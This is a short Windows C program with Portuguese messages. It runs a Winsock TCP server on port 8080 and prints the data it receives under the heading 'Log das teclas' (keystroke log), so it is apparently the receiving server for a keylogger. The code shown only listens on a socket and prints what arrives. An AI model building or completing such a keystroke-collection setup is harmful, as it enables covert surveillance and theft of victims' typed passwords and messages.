#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#define BUFFER_SIZE 4096

int main() {
    WSADATA wsa;
    SOCKET sockfd, newsockfd;
    struct sockaddr_in serv_addr, cli_addr;
    int clilen, n;
    char buffer[BUFFER_SIZE];

    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Erro ao inicializar o Winsock. Código de erro: %d\n", WSAGetLastError());
        return 1;
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == INVALID_SOCKET) {
        printf("Erro ao abrir o socket. Código de erro: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(8080);

    if (bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
        printf("Erro no bind. Código de erro: %d\n", WSAGetLastError());
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    listen(sockfd, 5);
    clilen = sizeof(cli_addr);
    newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);
    if (newsockfd == INVALID_SOCKET) {
        printf("Erro no accept. Código de erro: %d\n", WSAGetLastError());
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    memset(buffer, 0, BUFFER_SIZE);
    n = recv(newsockfd, buffer, BUFFER_SIZE - 1, 0);
    if (n == SOCKET_ERROR) {
        printf("Erro ao ler do socket. Código de erro: %d\n", WSAGetLastError());
    } else if (n == 0) {
        printf("Nenhum dado recebido.\n");
    } else {
        printf("Log das teclas: \n");
        for (int i = 0; i < strlen(buffer); i++) {
            printf("%c", buffer[i]);
        }
    }

    closesocket(newsockfd);
    closesocket(sockfd);
    WSACleanup();

    return 0;
}
